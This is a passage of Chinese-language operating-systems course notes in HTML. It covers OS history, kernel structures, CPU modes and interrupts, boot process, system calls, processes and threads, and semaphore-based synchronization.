title="操作系统的发展历史"></a>操作系统的发展历史</h2><ul><li><p>计算机硬件发展的四个典型阶段</p><ul><li>电子管时代</li><li>晶体管时代</li><li>集成电路时代</li><li>大规模集成电路时代</li></ul></li><li><p>操作系统发展的四个典型阶段</p><ol><li>手工操作</li><li>单道批处理系统</li><li>多道批处理系统</li><li>分时操作系统</li></ol></li><li><p>手工操作</p><ul><li>使用特点<ul><li>上机：编程（打孔），预约，操作机器（开关/接线）</li><li>程序启动与结束：手工处理</li></ul></li><li>缺点<ul><li>效率低：<code>CPU</code>运行时间少，例：100分钟 = 50分钟(装) + 10(<code>CPU</code>运行) + 40(拆)</li><li>用户独占</li><li>缺少交互</li></ul></li></ul></li><li><p>单道批处理系统</p><ul><li>工作过程<ul><li>管理员将多个作业输入到磁盘形成作业队列</li><li>监控程序依次自动处理磁盘中的每个作业<ul><li>装入—运行—撤出—装入—运行—撤出—……</li></ul></li><li>运行完毕，通知用户取出结果</li></ul></li><li>工作特点<ul><li>一批：作业队列</li><li>自动：识别作业</li><li>单道：串行</li></ul></li><li>单道批处理的两种实现方式<ul><li>联机批处理<ul><li><img src="/2022/03/09/osNote/image-20220101113211078.png" alt="image-20220101113211078"></li><li>特点：主机控制输入/输出</li><li>缺点：系统效率低</li></ul></li><li>脱机批处理<ul><li><img src="/2022/03/09/osNote/image-20220101113304832.png" alt="image-20220101113304832"></li><li>特点：卫星机控制输入/输出</li><li>优点：系统效率高</li><li>缺点：调度不灵活；保护问题</li></ul></li></ul></li><li>单道批处理系统中<code>CPU</code>的使用情况<ul><li><img src="/2022/03/09/osNote/image-20220101113722924.png" alt="image-20220101113722924"></li><li>现象：外设工作时<code>CPU</code>空闲，<code>CPU</code>工作时外设空闲</li><li>结论：<code>CPU</code>和外设效率低</li></ul></li><li>单道批处理系统程序的改进<ul><li><img src="/2022/03/09/osNote/image-20220101113908340.png" alt="image-20220101113908340"></li><li>程序设计合理<ul><li>使得<code>IO</code>发生时，程序可以继续做一些其他的工作，例如上图中的<code>WhileReading()</code>函数</li></ul></li><li>系统必须提供工具<ul><li>程序可以启动设备和测试设备</li></ul></li></ul></li></ul></li><li><p>多道批处理系统（<strong>重点</strong>）</p><ul><li>多道程序设计技术<ul><li>在内存中存放多道程序，当某道程序因为某种原因（例如请求<code>IO</code>时）不能继续运行，监控程序便调度另一程序投入运行，这样可以使<code>CPU</code>尽量处于忙绿状态，提高系统效率</li></ul></li><li>多道批处理系统<ul><li>采用多道程序设计技术实现的处理系统称为多道批处理系统</li></ul></li><li>多道批处理系统的设计目的<ul><li>提高系统的利用率（或吞吐量）<ul><li><code>CPU</code>和外设并行</li><li>外设之间也并行</li></ul></li></ul></li><li>多道程序相互穿插的运行过程<ul><li><img src="/2022/03/09/osNote/image-20220101114517467.png" alt="image-20220101114517467"></li><li><code>A、B</code>两道程序相互穿插的运行，使<code>CPU</code>和外设都尽量忙碌</li></ul></li><li>多道程序设计思想<ul><li>多个程序同时在计算机/虚拟机上运行</li><li>物理资源的共享<ul><li>时分：分成多个时段，不同进程错开使用不同时段</li><li>空分：分成多个单元，不同进程同时使用不同单元</li><li><img src="/2022/03/09/osNote/image-20220101114840918.png" alt="image-20220101114840918"></li></ul></li></ul></li><li>多道批处理系统的特点<ul><li>多道：内存同时存放多道程序</li><li>并行：宏观上</li><li>串行：微观上</li></ul></li><li>意义：多道技术出现——操作系统形成</li><li>多道批处理系统的缺点<ul><li>作业处理时间长</li><li>运行过程不确定</li><li>交互能力差</li><li><img src="/2022/03/09/osNote/image-20220101115115243.png" alt="image-20220101115115243"></li></ul></li><li>60年代硬件的两个重大进展<ul><li>中断技术<ul><li>当<code>CPU</code>收到外部信号（中断信号）后，停止当前的工作，转去处理该外部事件，处理完毕后回到原来工作的中断处（断点）继续原来的工作</li></ul></li><li>通道技术<ul><li>专门处理外设和内存之间的数据传输的处理机</li></ul></li></ul></li></ul></li><li><p>分时技术与多道批批处理系统都能完成多个程序的切换，这两种切换有何差别</p><ul><li>分时技术采用的方法是，主机以很短的时间片为单位把<code>CPU</code>轮流分配给每个终端使用，直到作业被全部运行完，让终端认为自己独占<code>CPU</code></li><li>多道批操作系统是内存中存放了多个程序，程序相互穿插运行，当某道程序没有使用<code>CPU</code>时，系统调度另一程序投入执行；多道批处理本质在微观上还是相当于单道批，但是分时技术可以把多个程序真正地“同时”（差别时间不大）运行</li></ul></li><li><p>分时操作系统</p><ul><li><p>背景</p><ul><li>中断技术</li><li>大规模集成电路</li><li>事务性任务和程序的涌现<ul><li>交互性高</li><li>响应快速</li></ul></li><li>要求：多任务多用户</li></ul></li><li><p>多终端计算机</p><ul><li>主机采用分时技术轮流为每个终端服务，每个终端都感觉到是“独占”主机</li></ul></li><li><p>分时技术（<strong>重点</strong>）</p><ul><li><p>概念</p><ul><li>主机以很短的“<strong>时间片</strong>”为单位，把<code>CPU</code>循环的轮流分配给每个作业（终端/用户）使用，直到全部作业被运行完</li></ul></li><li><p>特点</p><ul><li><p>时间片：较短时间间隔</p></li><li><p>响应及时：独占主机</p></li></ul></li></ul></li><li><p>分时系统的特点</p><ul><li>多路调制性<ul><li>多用户联机使用同一台计算机</li></ul></li><li>独占性<ul><li>用户感觉独占一台计算机</li></ul></li><li>交互性<ul><li>及时响应用户的请求</li></ul></li></ul></li></ul></li><li><p><code>UNIX</code></p><ul><li>第一个实用化的分时操作系统</li><li>革新和创造<ul><li>实现了操作系统的可移植性</li><li>“特殊文件”：外设看作文件</li></ul></li></ul></li><li><p>操作系统的进一步发展</p><ul><li>实时操作系统/嵌入式操作系统</li><li>微机操作系统</li><li>多处理机操作系统</li><li>网络操作系统</li><li>分布式操作系统</li><li>嵌入式操纵系统</li></ul></li></ul><h1 id="第二章-操作系统结构与硬件支持"><a href="#第二章-操作系统结构与硬件支持" class="headerlink" title="第二章 操作系统结构与硬件支持"></a>第二章 操作系统结构与硬件支持</h1><h2 id="操作系统虚拟机（重点）"><a href="#操作系统虚拟机（重点）" class="headerlink" title="操作系统虚拟机（重点）"></a>操作系统虚拟机（重点）</h2><ul><li>面对用户，裸机配置操作系统后称为操作系统虚拟机<ul><li>用户界面</li><li>屏蔽硬件细节</li><li>扩展硬件功能</li><li>系统更安全</li><li>系统更可靠</li><li>效率更高</li></ul></li></ul><h2 id="操作系统的逻辑结构"><a href="#操作系统的逻辑结构" class="headerlink" title="操作系统的逻辑结构"></a>操作系统的逻辑结构</h2><ul><li><p>逻辑结构</p><ul><li><code>OS</code>的设计和实现思路</li></ul></li><li><p>逻辑结构的种类</p><ul><li>整体式结构（单体式结构、宏内核结构）</li><li>微内核结构</li><li>层次式结构</li></ul></li><li><p>整体式结构</p><ul><li>以模块为基本单位构建<ul><li>每个模块具有特定的功能</li></ul></li><li>定义<ul><li>模块化结构/单体内核结构/宏内核结构</li><li>操作系统由大量的过程构成，每个过程都有明确参数列表、返回值类型，大多数过程是可以相互间调用的</li><li><img src="/2022/03/09/osNote/image-20220101142121165.png" alt="image-20220101142121165"></li></ul></li><li>优点<ul><li>模块的设计、编码和调试独立</li><li>模块之间可以相互调用</li></ul></li><li>缺点<ul><li>错误容易扩散</li><li>开发和维护困难</li><li>可伸缩性差</li></ul></li><li>实例<code>os</code>——<code>UNIX</code><ul><li>采用单一内核模块（单体结构）实现</li><li>对外提供一组系统调用</li><li>设备驱动与内核其他部分分开</li></ul></li><li>实例<code>os</code>——<code>Linux</code><ul><li>宏内核，单体内核</li><li>支持动态可安装模块</li><li>模块可以在操作系统中动态安装或去除</li><li>模块可以在内核运行时编译或安装</li></ul></li></ul></li><li><p>层次式结构</p><ul><li><p>层次结构的软件例子——<code>TCP/IP</code>协议栈</p></li><li><p>定义</p><ul><li>功能模块按调用次序排成若干层，各层单向依赖或单向调用</li><li><img src="/2022/03/09/osNote/image-20220101142104116.png" alt="image-20220101142104116"></li></ul></li><li><p>分层原则</p><ul><li>硬件相关——最底层</li><li>外部特性——最外层</li><li>中间层——调用次序或消息传递顺序</li><li>共性服务——较低层</li><li>活跃功能——较低层</li></ul><ol><li>硬件相关的放在最底层</li><li>与用户策略或用户交互相关的功能放在最顶层</li><li>中间层各层按调用次序或消息传递次序安排</li><li>共性的和活跃的服务放在较低的层次</li></ol></li><li><p>层次结构的优点</p><ul><li>结构清晰，避免循环调用</li><li>整体结构局部化，系统的正确性容易保证</li><li>有利于操作系统的维护、扩充和移植</li></ul></li></ul></li><li><p>微内核结构（客户/服务器结构）</p><ul><li>客户——应用程序</li><li>服务器——操作系统<ul><li>微内核<ul><li>足够小，提供<code>OS</code>最基本的核心功能和服务</li><li>足够与硬件紧密相关的处理</li><li>实现一些较基本的功能</li><li>负责客户与服务器之间的通信</li></ul></li><li>核外服务器<ul><li>完成<code>OS</code>的绝大多数功能，等待用户提供请求</li><li>由若干服务器或进程共同构成<ul><li>例如：进程/线程服务器，虚存服务器，设备管理服务器等，以进程形式运行在用户态</li></ul></li></ul></li><li><img src="/2022/03/09/osNote/image-20220101142309979.png" alt="image-20220101142309979"></li></ul></li></ul></li><li><p>微内核和单体内核（宏内核）的比较</p><ul><li><img src="/2022/03/09/osNote/image-20220101142441329.png" alt="image-20220101142441329"></li></ul></li></ul><h2 id="操作系统依赖的基本硬件环境"><a href="#操作系统依赖的基本硬件环境" class="headerlink" title="操作系统依赖的基本硬件环境"></a>操作系统依赖的基本硬件环境</h2><h3 id="处理机的态（重点）"><a href="#处理机的态（重点）" class="headerlink" title="处理机的态（重点）"></a>处理机的态（<strong>重点</strong>）</h3><ul><li><p>支持操作系统的最基本的硬件结构</p><ul><li><code>CPU</code>、内存、中断、时钟</li></ul></li><li><p>操作系统考虑的安全问题</p><ul><li>共享/安全<ul><li>防止进程的信息被非法访问</li><li>防止进程随意存取系统资源</li><li>防止进程修改系统安全机制</li><li><img src="/2022/03/09/osNote/image-20220101142817081.png" alt="image-20220101142817081"></li></ul></li><li>解决策略<ol><li>软件被设置为可信软件和不可信软件两类<ul><li>保护机制能区分可信软件和不可信软件</li><li>可信软件权限高<ul><li>可以修改安全保护机制</li><li>可以存取系统资源</li></ul></li><li>不可信软件<ul><li>功能受限</li></ul></li><li><code>CPU</code>能区分当前软件的类型并设置不同的工作模式</li></ul></li><li>设置访问屏障<ul><li><code>CPU</code>根据当前的工作模式，限制可使用的指令集</li><li>设置可信软件和不可信软件之间的访问屏障</li></ul></li></ol></li></ul></li><li><p><code>CPU</code></p><ul><li><code>CPU</code>态（<code>Mode</code>）<ul><li><code>CPU</code>的工作状态</li><li>对<strong>资源和指令使用</strong>权限的描述</li></ul></li><li>硬件描述<ul><li>在处理器中包含有一个模式位，表明当前的权限状态</li><li>指令执行前增加“权限状态是否满足”的条件判断</li><li><code>Intel CPU</code><ul><li><code>PE</code>位，<code>PG</code>位</li><li>地址映射机制</li><li>权限核验</li></ul></li></ul></li><li>特权指令<ul><li>类别<ol><li>涉及外部设备的输入/输出指令</li><li>修改特殊寄存器的指令</li><li>改变机器状态的指令</li></ol></li></ul></li><li><code>CPU</code>态的分类<ul><li>核态<ul><li>能够访问所有资源和执行所有指令</li><li>管理程序/<code>OS</code>内核</li></ul></li><li>用户态<ul><li>仅能访问部分资源，其他资源受限</li><li>用户进程</li></ul></li><li>管态<ul><li>介于核态和用户态之间</li></ul></li></ul></li><li>硬件和<code>OS</code>对<code>CPU</code>的观察<ul><li>硬件按“态”来区分<code>CPU</code>的状态</li><li><code>OS</code>按“进程”来区分<code>CPU</code>的状态</li><li><img src="/2022/03/09/osNote/image-20220101145115299.png" alt="image-20220101145115299"></li></ul></li><li>用户态和核态之间的转换<ul><li>用户态向核态转换<ul><li>用户请求<code>OS</code>提供服务</li><li>发生中断</li><li>用户进程产生错误（内部中断）</li><li>用户态企图执行特权指令</li></ul></li><li>核态向用户态转换的情形<ul><li>一般是中断返回：<code>IRET</code></li></ul></li></ul></li></ul></li><li><p>内存</p><ul><li>存储器：存储程序和数据的部件</li><li>存储器分类<ul><li>按与<code>CPU</code>的联系<ul><li>主存：直接与<code>CPU</code>交换信息</li><li>辅存：不能直接和<code>CPU</code>交换信息</li></ul></li><li>按存储器（半导体存储器）读写工作方式<ul><li>RAM</li><li>ROM</li></ul></li></ul></li><li>理想体系<ul><li>理想存储体系：速度快、容量大、成本低</li><li>实际存储体系<ul><li>寄存器</li><li>高速缓存</li><li>主存</li><li>磁盘</li></ul></li></ul></li><li>分级存储系统的工作原理<ul><li><code>CPU</code>读取指令或数据时的访问顺序<ol><li>访问缓存</li><li>访问内存</li><li>访问辅存</li></ol></li><li><img src="/2022/03/09/osNote/image-20220101150413394.png" alt="image-20220101150413394"></li></ul></li></ul></li><li><p>时钟</p><ul><li>以固定时间间隔产生时钟信号，提供计算机所需的节拍</li><li>时钟的作用：<ul><li>时间片</li><li>提供绝对时间</li><li>提供预定的时间间隔</li></ul></li><li>时钟的类型<ul><li>绝对时钟</li><li>相对时钟</li></ul></li></ul></li></ul><h3 id="中断机制（重点）"><a href="#中断机制（重点）" class="headerlink" title="中断机制（重点）"></a>中断机制（<strong>重点</strong>）</h3><ul><li>中断<ul><li><p>中断定义</p><ul><li>只<code>CPU</code>对突发的外部事件的反应过程或机制</li><li><code>CPU</code>收到外部信号后，停止当前工作，转去处理该外部事件，处理完毕后回到原来工作的地方继续原来的工作</li></ul></li><li><p>引入中断的目的</p><ul><li>实现并发活动</li><li>实现实时处理</li><li>故障自动处理</li></ul></li><li><p><img src="/2022/03/09/osNote/image-20220101150816219.png" alt="image-20220101150816219"></p></li><li><p>中断的一些概念</p><ul><li><p>中断源</p><ul><li>引起系统中断的事件称为中断源</li></ul></li><li><p>中断类型</p><ul><li><p>强迫中断和自愿中断</p><ul><li>强迫中断：程序没有预期，例如：<code>IO</code>、外部中断</li><li>自愿中断：程序有预期，例如：执行访管指令</li></ul></li><li><p>外中断（中断）和内中断（俘获）</p><ul><li>外中断：由<code>CPU</code>外部事件引起，例如：<code>IO</code>、外部事件</li><li>内中断：由<code>CPU</code>内部事件引起，例如：访管指令、程序中断</li></ul></li><li><p>外中断：不可屏蔽中断和可屏蔽中断</p><ul><li>不可屏蔽中断：中断的原因很紧要，<code>CPU</code>必须响应</li><li>可屏蔽中断：中断的原因不很紧要，<code>CPU</code>可以不响应</li></ul></li></ul></li><li><p>断点</p><ul><li>程序中断的地方，将要执行的下一条指令的地址</li><li><code>CS：IP</code></li></ul></li><li><p>现场</p><ul><li>程序正确运行所依赖的信息集合</li><li><code>PSW</code>程序状态字，<code>PC</code>，相关寄存器</li></ul></li><li><p>进入中断服务程序：破坏主程序的现场</p></li><li><p>现场的两个处理过程</p><ul><li>现场的保护：进入中断服务程序之前，入栈</li><li>现场的恢复：退出中断服务程序之后，出栈</li></ul></li></ul></li><li><p>中断响应过程</p><ol><li>识别中断源</li><li>保护断点和现场</li><li>装入中断服务程序</li><li>进入中断服务程序</li><li>恢复现场和断点</li><li>中断返回：<code>IRET</code></li><li><img src="/2022/03/09/osNote/image-20220101152157861.png" alt="image-20220101152157861"></li></ol></li><li><p><img src="/2022/03/09/osNote/image-20220101152600617.png" alt="image-20220101152600617"></p></li><li><p>中断响应的实质</p><ul><li>交换指令执行地址</li><li>交换<code>CPU</code>的态</li><li>工作<ul><li>现场保护和恢复</li><li>参数传递（通信）</li></ul></li></ul></li></ul></li></ul><h1 id="第三章-用户界面"><a href="#第三章-用户界面" class="headerlink" title="第三章 用户界面"></a>第三章 用户界面</h1><h2 id="用户环境和构造"><a href="#用户环境和构造" class="headerlink" title="用户环境和构造"></a>用户环境和构造</h2><ul><li>用户环境<ul><li>用户工作的软件环境<ul><li>桌面环境</li><li>命令行环境</li></ul></li></ul></li><li>用户环境构造<ul><li>按照用户要求和硬件特性按照和配置操作系统<ul><li>提供操作命令和界面</li><li>提供系统用户手册</li></ul></li></ul></li></ul><h2 id="操作系统的启动"><a href="#操作系统的启动" class="headerlink" title="操作系统的启动"></a>操作系统的启动</h2><ul><li><p>相关背景知识</p><ul><li>实模式和保护模式</li><li><code>BIOS</code>(<code>Basic I/O System</code>)</li><li><code>POST</code>(<code>Power On Self Test</code>)</li><li><code>CMOS</code></li></ul></li><li><p>启动过程</p></li><li><p>操作系统的安装</p><ul><li><code>MBR</code>（主引导程序）</li><li>安装过程</li><li>多操作系统安装和启动</li></ul></li><li><p>实模式（实地址模式）</p><ul><li>程序按照8086寻址方式访问0-<code>FFFFFh</code>（<code>1MB</code>）空间</li><li>寻址方式：物理地址（20位）</li><li><code>CPU</code>单任务运行</li><li>实模式存取的<code>1M</code>空间<ul><li>前面<code>640K</code>：基本内存</li><li>中间<code>128K</code>：显卡显存</li><li>末尾<code>256K</code>：<code>BIOS</code></li></ul></li></ul></li><li><p><code>MBR</code></p><ul><li>和<code>os</code>启动相关的数据和代码</li><li>存放在主启动扇区</li><li><code>MBR</code>读取分区表，查找并确认唯一活动分区，<code>MBR</code>读取活动分区<code>PBR</code>，并加载到内存</li><li><code>PBR</code>控制后续引导进程</li></ul></li><li><p><code>BIOS</code></p><ul><li>基本输入输出系统</li><li>功能：<ul><li><code>CMOS</code>设置</li><li>基本<code>IO</code>设备中断服务</li><li><code>POST</code>上电自检</li><li>系统自举/加载<code>OS</code></li></ul></li></ul></li><li><p><code>POST</code></p><ul><li>加电自检</li><li>初始化基本硬件<ul><li><code>CPU</code>、内存、显卡</li></ul></li></ul></li><li><p>系统自举/加载<code>OS</code></p><ul><li>开机时将<code>OS</code>载入内存并运行，为用户建立用户环境</li></ul></li><li><p>操作系统的启动</p><ul><li>从加电到用户工作环境准备好的过程</li></ul><ol><li>初始引导</li><li>核心初始化</li><li>系统初始化</li></ol></li></ul><ol><li>初始引导<ul><li>目的：把<code>OS</code>内核装入内存并使之开始工作，接管计算机系统</li><li>过程：<ul><li>加电，<code>jump POST</code></li><li>跳入<code>BIOS</code>的启动程序<ul><li>读取第0面0道1扇区的内容</li><li><code>MBR</code>：主启动记录，引导程序</li></ul></li><li>运行引导程序<ul><li>根据相关参数，读取硬盘指定位置的<code>OS</code>内核到内存</li><li>初始化基本参数</li></ul></li><li><code>OS</code>内核：逐步加载<code>OS</code>剩余部分，直到最后完全控制计算机</li></ul></li></ul></li><li>核心初始化<ul><li>目的：<code>OS</code>内核初始化系统的核心数据</li></ul></li><li>系统初始化<ul><li>目的：为用户使用系统做准备，使系统处于待命状态</li></ul></li></ol><h2 id="用户界面"><a href="#用户界面" class="headerlink" title="用户界面"></a>用户界面</h2><ul><li><p>用户界面的定义</p><ul><li><code>OS</code>提供给用户控制计算机的机制，又称用户接口</li><li><img src="/2022/03/09/osNote/image-20220101160545346.png" alt="image-20220101160545346"></li></ul></li><li><p>用户界面的类型</p><ul><li><p>操作界面</p></li><li><p>系统调用</p></li></ul></li></ul><h3 id="操作界面"><a href="#操作界面" class="headerlink" title="操作界面"></a>操作界面</h3><ul><li>图形用户接口</li><li>键盘命令<ul><li>普通命令：<code>ls、cd、ps</code>等</li><li>批处理程序：普通命令的集合，批执行</li><li><code>shell</code>：操作系统和用户交互的界面<ul><li><code>shell</code>表现为通过控制台执行用户命令的方式</li><li><code>shell</code>本身不执行命令，仅仅是组织和管理命令</li></ul></li></ul></li></ul><h3 id="系统调用（重点）"><a href="#系统调用（重点）" class="headerlink" title="系统调用（重点）"></a>系统调用（<strong>重点</strong>）</h3><ul><li>系统调用<ul><li>操作系统内核为应用程序提供的一系列服务/函数</li></ul></li><li>特点<ul><li>一般涉及核心资源或硬件的操作</li><li>系统调用运行于核态</li><li>每个系统调用有唯一的编号：<code>ID</code></li><li>系统调用过程会产生中断：自愿中断</li></ul></li><li>具体<code>OS</code>中系统调用的实现<ul><li><code>DOS</code>：<code>int 21h</code></li><li><code>Linux</code>：<code>int 80h</code></li></ul></li><li>访管指令<ul><li>用于实现在用户态下运行的进程调用操作系统内核程序</li><li>执行过程<ol><li>设置模式位</li><li>转入内核某固定位置（自陷中断处理）</li><li>跳转到相应的<code>OS</code>服务例程，执行</li><li>返回用户空间</li></ol></li></ul></li></ul><h1 id="第四章-进程管理"><a href="#第四章-进程管理" class="headerlink" title="第四章 进程管理"></a>第四章 进程管理</h1><h2 id="进程概念"><a href="#进程概念" class="headerlink" title="进程概念"></a>进程概念</h2><ul><li>进程定义<ul><li>进程是程序在某个数据集合上的一次运行活动<ul><li>数据集合：软硬件环境，多个进程共存/共享的环境</li></ul></li></ul></li><li>进程的特征<ul><li>动态性：进程是程序的一次执行过程，动态产生/消亡</li><li>并发性：进程可以同其他进程一起向前推进</li><li>异步性：进程按各自的速度向前推进</li><li>独立性：进程是系统分配资源和调度<code>CPU</code>的单位</li></ul></li><li>进程和程序的区别<ul><li>动态和静态<ul><li>进程是动态的：程序的一次执行过程</li><li>程序是静态的：一组指令的有序集合</li></ul></li><li>暂存和长存<ul><li>进程是暂存的：在内存上驻留</li><li>程序是长存的：在介质上长期保存</li></ul></li><li>一个程序可能有多个进程</li></ul></li><li>进程的类型<ul><li>按使用资源的权限<ul><li>系统进程：指系统内核相关的进程</li><li>用户进程：运行于用户态的进程</li></ul></li><li>按对<code>CPU</code>的依赖性<ul><li>偏<code>CPU</code>进程：计算型进程</li><li>偏<code>IO</code>进程：侧重于<code>IO</code>的进程</li></ul></li></ul></li></ul><h2 id="进程的状态"><a href="#进程的状态" class="headerlink" title="进程的状态"></a>进程的状态</h2><ul><li>进程的状态<ul><li>运行状态：进程已经占有<code>CPU</code>，在<code>CPU</code>上运行</li><li>就绪状态：具有运行条件但由于无<code>CPU</code>，暂时不能运行</li><li>阻塞状态：因为等待某项服务完成或信号到来而不能运行的状态，例如：系统调用，<code>IO</code>操作，合作进程的信号或服务</li><li>进程状态的变迁：<ul><li><img src="/2022/03/09/osNote/image-20220101185108807.png" alt="image-20220101185108807"></li><li><img src="/2022/03/09/osNote/image-20220101185137670.png" alt="image-20220101185137670"></li></ul></li></ul></li><li>支持挂起和解挂操作的进程状态<ul><li><img src="/2022/03/09/osNote/image-20220101185328397.png" alt="image-20220101185328397"></li></ul></li></ul><h2 id="进程控制块（PCB）"><a href="#进程控制块（PCB）" class="headerlink" title="进程控制块（PCB）"></a>进程控制块（PCB）</h2><ul><li>进程的描述——进程控制块<ul><li>描述进程的状态、资源、和相关进程的关系的一种数据结构</li><li><code>PCB</code>是进程的标志</li><li>创建进程时创建<code>PCB</code>，进程撤销后<code>PCB</code>同时撤销</li></ul></li><li>和进程标识相关的成员变量<ul><li><code>PID</code>：进程ID</li><li><code>PPID</code>：父进程ID</li><li><code>PGID</code>：进程组ID</li></ul></li></ul><h2 id="线程概念"><a href="#线程概念" class="headerlink" title="线程概念"></a>线程概念</h2><ul><li>线程的概念<ul><li>线程是进程内的一个执行路径</li><li>一个进程可以包含多个线程</li><li>线程之间共享<code>CPU</code>可以实现并发运行</li><li>创建线程比创建进程开销要小</li><li>线程间通信十分方便</li></ul></li><li>适用场景<ul><li>程序的多个功能需要并发运行</li><li>提高窗口的交互性</li><li>改善程序的结构</li><li>多核<code>CPU</code>上的应用，充分发挥多核性能</li></ul></li></ul><h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><ul><li><p>进程控制的概念</p><ul><li>在进程的生存全期间，对其全部行为的控制</li><li>四个典型的进程控制<ul><li>创建进程：创建一个具有指定标识ID的进程<ul><li>参数：进程标识、优先级、进程起始地址、<code>CPU</code>初始状态、资源清单等</li></ul></li><li>撤销进程：撤销一个指定的进程<ul><li>收回进程所占有的资源，撤销该进程的<code>PCB</code></li><li>撤销的时机：正常结束、异常结束、外界干预</li><li>参数：被撤销的进程名ID</li></ul></li><li>阻塞进程：停止进程执行，变为阻塞<ul><li>阻塞的时机：请求系统服务、启动某种操作、新数据未到、无新工作</li><li>参数：阻塞原因，不同原因有不同的阻塞队列</li></ul></li><li>唤醒进程：唤醒处于阻塞队列中的某个进程<ul><li>唤醒的时机：系统服务满足，<code>IO</code>完成、新数据到达、进程提出新要求</li><li>参数：被唤醒进程的标识</li></ul></li></ul></li></ul></li><li><p>创建进程的过程</p><ul><li>创建一个空白的<code>PCB</code></li><li>赋予进程标识符ID</li><li>为进程分配空间</li><li>初始化<code>PCB</code>：默认值</li><li>插入相应的进程队列：新进程插入就绪队列</li></ul></li><li><p>进程撤销的实现</p><ul><li>在<code>PCB</code>队列中检索出该<code>PCB</code></li><li>获取该进程的状态</li><li>若该进程处在运行态，立即终止该进程<ul><li>（递归）先撤销子进程</li><li>子进程挂到<code>init</code>进程下</li></ul></li><li>释放进程占有的资源</li><li>将进程从<code>PCB</code>队列中移除</li></ul></li><li><p>进程阻塞的实现</p><ul><li>停止运行</li><li>将<code>PCB</code>运行态改为阻塞态</li><li>插入对应的阻塞队列</li><li>转调度程序</li></ul></li><li><p>原语</p><ul><li>由若干指令构成的具有特定功能的函数</li><li>具有原子性，其操作不可分割</li><li>创建原语、撤销原语、阻塞原语、唤醒原语</li></ul></li><li><p><code>windows</code>进程控制</p><ul><li><code>CreateProcess</code>函数</li></ul></li><li><p><code>Linux</code>进程控制——<code>fork</code></p><ul><li><code>fork</code>创建进程<ul><li>子进程是父进程的复制</li><li>父进程和子进程并发运行（在<code>fork</code>函数之后）</li><li><code>fork</code>的返回值：子进程返回<code>0</code>，父进程返回子进程<code>ID</code>，出错返回<code>-1</code></li></ul></li><li>进程执行特定的功能<ul><li><code>exec</code>函数族，功能：装入一个指定的可执行程序运行，使子进程具有和父进程完全不同的新功能</li></ul></li><li><code>fork</code>常规用法<ul><li><img src="/2022/03/09/osNote/image-20220101192451127.png" alt="image-20220101192451127"></li></ul></li></ul></li><li><p><code>linux</code>进程控制——<code>wait(int &amp;status)</code></p><ul><li>进程调用<code>wait</code>来阻塞自己<ul><li>检测子进程是否结束<ul><li>未结束：等待子进程结束，继续阻塞</li><li>已结束：<code>wait</code>收集该子进程信息并彻底销毁它后返回</li></ul></li><li><code>Status</code>接收子进程退出时的退出代码<ul><li>若忽略子进程的退出信息：<code>wait(NULL)</code></li></ul></li></ul></li></ul></li><li><p><code>linux</code>进程控制——<code>exit(int status)</code></p><ul><li>调用<code>exit</code>终结进程</li><li>进程终结时要释放资源并向父进程报告<ul><li>利用<code>status</code>向父进程传递退出代码</li><li>变为僵尸进程，保留部分<code>PCB</code>信息供<code>wait</code>收集</li><li>调用<code>schedule</code>函数，选择新进程运行</li></ul></li></ul></li><li><p><code>Linux</code>进程控制——<code>sleep(int nSecond)</code></p><ul><li>进程暂停执行<code>nSecond</code>秒</li></ul></li></ul><h2 id="同步与互斥"><a href="#同步与互斥" class="headerlink" title="同步与互斥"></a>同步与互斥</h2><ul><li>进程的互斥关系<ul><li>多个进程由于共享具有独占性的资源，必须协调各进程对资源的存取顺序：确保没有任何两个或以上的进程同时进行资源的存取</li><li>临界资源：一次只允许一个进程独占访问的资源，例如：共享变量<code>i</code></li><li>临界区：进程中访问临界资源的程序段</li><li>临界资源和临界区的共享特点<ul><li>临界资源的访问具有排他性</li><li>并发进程不能同时进入“临界区”</li></ul></li><li>访问临界区的方法<ul><li>锁机制</li><li>信号量</li></ul></li></ul></li><li>进程的同步关系<ul><li>若干合作进程为了共同完成一个任务，需要相互协调运行步伐，一个进程A开始某个操作之前要求另一个进程B必须已经完成另一个操作，否则进程A只能等待</li><li>互斥关系属于特殊的同步关系</li></ul></li></ul><h2 id="同步机制"><a href="#同步机制" class="headerlink" title="同步机制"></a>同步机制</h2><ul><li>锁机制<ul><li>基本原理<ul><li>设置一个标识<code>S</code>：表明临界资源是否可用</li><li>在进入临界区之前先检查标志是否可用</li><li>进入临界区后，将标志修改为不可用——上锁</li><li>退出临界区，将标志修改为可用——解锁</li></ul></li><li>上锁原语和解锁原语</li></ul></li><li>设置临界区的四个原则<ul><li>忙则等待</li><li>空闲让进</li><li>有限等待</li><li>让权等待：等待进程放弃<code>CPU</code>（锁机制不满足）</li></ul></li></ul><h2 id="信号量和PV操作"><a href="#信号量和PV操作" class="headerlink" title="信号量和PV操作"></a>信号量和<code>PV</code>操作</h2><ul><li><p>信号灯机制</p><ul><li><p>信号灯数据结构</p><ul><li>信号灯定义为一个二元矢量(S, q)</li><li><code>S</code>信号量：整数，初值非负</li><li><code>q</code>队列：进程<code>PCB</code>集合</li></ul></li><li><p>两个操作</p><ul><li><code>P、V</code>操作</li></ul></li><li><p><code>P</code>操作</p><ul><li><img src="/2022/03/09/osNote/image-20220101201058298.png" alt="image-20220101201058298"></li></ul></li><li><p><code>V</code>操作</p><ul><li><img src="/2022/03/09/osNote/image-20220101201126834.png" alt="image-20220101201126834"></li></ul></li><li><p>信号灯与<code>PV</code>操作的应用</p><ul><li><p>实现进程互斥</p><ul><li><p>实质是实现对临界区的互斥访问</p><p>1个临界资源：允许最多一个进程处于临界区</p><p>M个临界资源：允许最多<code>M</code>个程序同时处于临界区</p></li><li><p>应用过程</p><p>进入临界区之前先执行<code>P</code>操作</p><p>离开临界区之后再执行<code>V</code>操作</p><p><code>S</code>的初值设置要合理（S初值为临界资源的数量）</p></li><li><p>例子：<img src="/2022/03/09/osNote/image-20220101201527187.png" alt="image-20220101201527187"></p></li></ul></li><li><p>实现进程的同步</p><ul><li><p>同步机制实质</p><p>运行条件不满足时，能让进程暂停</p><p>运行条件满足时，能让进程立即继续</p></li><li><p><code>PV</code>操作应用于进程同步的基本思路</p><p>暂停当前进程：在关键操作之前执行<code>P</code>操作</p><p>继续进程：在关键操作之后执行<code>V</code>操作</p><p>定义有意义的信号量<code>S</code>，并设置合适的初值（不合理的初值会引发死锁）</p></li></ul></li></ul></li></ul></li></ul><h2 id="经典同步问题"><a href="#经典同步问题" class="headerlink" title="经典同步问题"></a>经典同步问题</h2><ul><li>生产者、消费者问题</li><li>读者、编者问题</li></ul><h2 id="进程通信"><a href="#进程通信" 